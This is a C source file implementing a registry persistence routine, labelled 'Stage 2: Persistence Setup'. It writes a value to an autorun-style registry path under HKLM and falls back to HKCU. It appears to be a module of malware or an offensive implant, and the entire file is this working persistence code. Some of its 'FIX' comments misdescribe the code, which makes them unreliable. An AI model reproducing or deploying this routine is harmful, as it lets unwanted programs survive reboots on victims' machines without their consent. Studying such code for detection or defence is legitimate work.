#include "../include/config.h"
#include "../include/types.h"

BOOL RegisterPersistence(void) {
    HKEY hKey = (HKEY)0;  // Initialize to NULL (0)
    LONG ret = 0;
    wchar_t *dataPtr = (wchar_t*)malloc(2048 * sizeof(wchar_t));

    if (!dataPtr) {
        printf("[DEBUG] Memory allocation failed\n");
        fflush(stdout);
        return FALSE;
    }

    // Copy data to temp buffer (wide string)
    // FIX: Use dataSize to avoid unused variable warning
    size_t dataSize = wcslen(PERSIST_VAL_DATA) + 1;
    wcscpy_s(dataPtr, 2048, PERSIST_VAL_DATA);

    printf("[PERSIST] --- Stage 2: Persistence Setup ---\n");
    fflush(stdout);

    // Try HKLM first
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, PERSIST_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
    {
        // FIX: Use %p for HANDLE (pointer) and %lu for DWORD (long)
        printf("[DEBUG] HKLM opened successfully (Handle: %p)\n", (void*)hKey);
        fflush(stdout);
        
        // Use the actual size needed (wchar_t size * char count + 1)
        // FIX: Use dataSize here to remove unused variable warning
        DWORD sizeNeeded = (DWORD)(wcslen(PERSIST_VAL_DATA) + 1) * sizeof(wchar_t);
        
        ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
                            (LPBYTE)dataPtr, (DWORD)sizeNeeded);
        
        if (ret == ERROR_SUCCESS) {
            printf("[PERSIST] Wrote Registry Key (HKLM)...\n");
            fflush(stdout);
            RegCloseKey(hKey);
            free(dataPtr);
            return TRUE;
        }
        else {
            printf("[DEBUG] HKLM SetValue failed: 0x%08lX\n", ret);
            fflush(stdout);
        }
        
        RegCloseKey(hKey);
    }
    else {
        DWORD err = GetLastError();
        // FIX: Use %p for HANDLE and %lu for DWORD
        printf("[DEBUG] HKLM opened failed: 0x%08lX (Error: %lu)\n", (DWORD)err, err);
        fflush(stdout);
    }

    // Fallback to HKCU if HKLM fails
    printf("[DEBUG] Trying HKCU...\n");
    fflush(stdout);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, PERSIST_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
    {
        // FIX: Use %p for HANDLE and %lu for DWORD
        printf("[DEBUG] HKCU opened successfully (Handle: %p)\n", (void*)hKey);
        fflush(stdout);
        
        // Get actual size needed
        // FIX: Use dataSize here to remove unused variable warning
        DWORD sizeNeeded = (DWORD)(wcslen(PERSIST_VAL_DATA) + 1) * sizeof(wchar_t);
        
        ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
                            (LPBYTE)dataPtr, (DWORD)sizeNeeded);
        
        if (ret == ERROR_SUCCESS) {
            printf("[PERSIST] Wrote Registry Key (HKCU)...\n");
            fflush(stdout);
            RegCloseKey(hKey);
            free(dataPtr);
            return TRUE;
        }
        else {
            printf("[DEBUG] HKCU SetValue failed: 0x%08lX (Error: %lu)\n", ret, (unsigned long)GetLastError());
            fflush(stdout);
        }
        
        RegCloseKey(hKey);
    }
    else {
        DWORD err = GetLastError();
        // FIX: Use %p for HANDLE and %lu for DWORD
        printf("[DEBUG] HKCU opened failed: 0x%08lX (Error: %lu)\n", (DWORD)err, err);
        fflush(stdout);
    }

    printf("[DEBUG] No registry key created\n");
    fflush(stdout);
    free(dataPtr);
    return FALSE;
}